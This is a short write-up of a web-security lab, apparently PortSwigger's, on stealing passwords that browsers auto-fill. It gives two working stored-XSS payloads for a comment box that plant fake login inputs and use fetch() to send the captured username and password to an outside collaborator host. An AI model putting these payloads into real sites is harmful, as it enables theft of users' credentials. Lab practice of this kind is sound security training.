# Steal password from auto fill

- **Information** :   These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.
- The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)

### Solution :

- vuln. exist in comment box. So we need to write some payloads(mine payload)

```jsx
<input id=username type=text name=username>
<input id=password type=password name=password onchange='if(username.value.length) fetch("https://collaborator.com?username="+username.value+"&password="+password.value)' >
```

OR You can use portswigger payload : 

```jsx
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

- submit and check in Collaborator(HTTP section), u get the  username and password.

![password.png](Steal%20password%20from%20auto%20fill/password.png)

![Screenshot_2026-02-04_09-52-39.png](Steal%20password%20from%20auto%20fill/Screenshot_2026-02-04_09-52-39.png)